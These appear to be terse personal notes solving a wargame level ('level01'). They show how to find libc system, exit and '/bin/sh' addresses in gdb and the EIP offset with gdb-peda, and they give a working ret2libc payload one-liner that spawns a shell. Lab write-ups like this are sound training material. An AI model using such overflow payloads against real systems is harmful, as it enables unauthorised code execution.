0xf7e6aed0 p &system
0xf7e5eb70 p &exit

HOW TO FIND /bin/sh

0xf7f897ec

(gdb) info proc map
strings -a -t x /lib32/libc-2.15.so | grep "/bin/sh"
(gdb) x/s (start addr+result)
-----------
(gdb)find &system,+999999,"/bin/sh"

HOW TO FIND OFFSET FOR EIP
gdb-peda pattern create 200
*launch and put pattern*
*segv*
gdb-peda pattern search
Registers contain pattern buffer:
EIP+0 found at offset: 80 <-------------
EBX+0 found at offset: 68
EDI+0 found at offset: 72
EBP+0 found at offset: 76
ECX+52 found at offset: 69


EXPLOIT:

dat_wil\n + 80xpadding + addr of system + return addr of system (exit) + addr of /bin/sh


(python -c 'print "dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat -) | ./level01 


\xd0\xae\xe6\xf7\x70\xeb\xe5\xf7\xec\x97\xf8\xf7